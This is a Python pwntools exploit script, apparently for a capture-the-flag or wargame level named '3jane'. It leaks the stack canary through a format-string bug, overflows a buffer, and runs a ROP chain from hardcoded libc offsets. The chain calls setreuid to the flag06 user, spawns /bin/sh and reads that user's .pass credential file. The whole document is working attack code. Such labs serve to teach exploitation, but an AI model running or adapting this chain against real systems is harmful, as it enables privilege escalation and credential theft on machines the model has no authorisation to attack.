#!/usr/bin/env python3
import re
from pwn import *

BINARY = "./3jane"
context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.log_level = "error"

LIBC = 0x7FFFF7C00000
POP_RDI = LIBC + 0x10C08D
POP_RSI = LIBC + 0x110B7D
SETREUID = LIBC + 0x127370
BIN_SH = LIBC + 0x1CC42F
SYSTEM = LIBC + 0x58750
FLAG06_UID = 1023

chain = flat(
    POP_RDI, FLAG06_UID,
    POP_RSI, FLAG06_UID,
    SETREUID,
    POP_RDI, BIN_SH,
    SYSTEM,
)

for attempt in range(8):
    io = process(BINARY)
    io.sendafter(b"Request ID: ", b"%15$p\n")
    out = io.recvuntil(b"Access code: ", timeout=3).decode(errors="replace")
    m = re.search(r"Logging: (0x[0-9a-f]+)", out)
    if not m:
        io.close()
        continue
    canary = int(m.group(1), 16)
    if b"\x0a" in p64(canary):
        io.close()
        continue
    payload = b"A" * 136 + p64(canary) + p64(0x4141414141414141) + chain + b"\n"
    io.send(payload)
    io.sendline(b"id")
    io.sendline(b"cat /home/flag06/.pass")
    out = io.recvall(timeout=3).decode(errors="replace")
    io.close()
    print(out[-300:], flush=True)
    if "flag06" in out:
        print("[+] flag06, password printed above", flush=True)
        break
else:
    print("[-] failed after 8 attempts", flush=True)
